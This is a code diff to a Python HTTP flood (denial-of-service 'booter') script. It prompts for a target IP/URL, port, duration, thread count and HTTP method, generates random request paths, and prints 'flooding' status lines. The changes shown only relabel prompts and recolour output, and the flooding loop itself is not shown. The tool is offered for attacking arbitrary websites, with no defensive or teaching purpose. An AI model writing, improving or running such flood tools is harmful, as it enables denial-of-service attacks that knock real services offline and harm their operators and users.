@@ -22,7 +22,7 @@ def clear_text():
         os.system('clear')
 
 def status_print(ip,port,thread_id,rps,path_get):
-    print(f"{Fore.YELLOW}flooding {Fore.LIGHTYELLOW_EX}HTTP{Fore.WHITE} {Fore.WHITE}==⟩ {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+    print(f"{Fore.LIGHTWHITE_EX}flooding {Fore.LIGHTYELLOW_EX}HTTP{Fore.WHITE} {Fore.WHITE}==⟩ {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
@@ -116,16 +116,15 @@ banner = f"""
 print(banner)
 host = ""
 ip = ""
-print(f"{Fore.LIGHTWHITE_EX}pyp own1-5")
-data_type_loader_packet = input(f"{Fore.LIGHTYELLOW_EX}::Type packet ==⟩⟩").upper()
+print(f"{Fore.BLACK}pyp own5")
 target_loader = input(f"{Fore.LIGHTYELLOW_EX}::IP/URL ==⟩")
 port_loader = int(input(f"{Fore.YELLOW}Port ==⟩"))
-time_loader = time.time() + int(input(f"{Fore.LIGHTYELLOW_EX}time ==⟩"))
-spam_loader = int(input(f"{Fore.LIGHTGREEN_EX}Spam ==⟩ "))
-create_thread = int(input(F"{Fore.LIGHTGREEN_EX}Create ==⟩"))
-booter_sent = int(input(F"{Fore.GREEN}Sent Attack ==⟩ "))
-methods_loader = input(f"{Fore.LIGHTBLUE_EX}HTTP_methods (GET POST HEAD)==⟩").upper()
-spam_create_thread = int(input(F"{Fore.LIGHTBLACK_EX}spam create thread (5 ) =⟩ "))
+time_loader = time.time() + int(input(f"{Fore.LIGHTYELLOW_EX}TIME ==⟩"))
+spam_loader = int(input(f"{Fore.LIGHTGREEN_EX}SPAM ==⟩ "))
+create_thread = int(input(F"{Fore.LIGHTGREEN_EX}THREADS ==⟩"))
+booter_sent = int(input(F"{Fore.GREEN}REQUEST SENT ==⟩ "))
+methods_loader = input(f"{Fore.LIGHTBLUE_EX}HTTP_methods (GET POST HEAD) ==⟩").upper()
+spam_create_thread = int(input(F"{Fore.LIGHTBLACK_EX}CREATE THREADS ==⟩ "))
 print(f"{Fore.MAGENTA}trying to GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
 try:
     host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
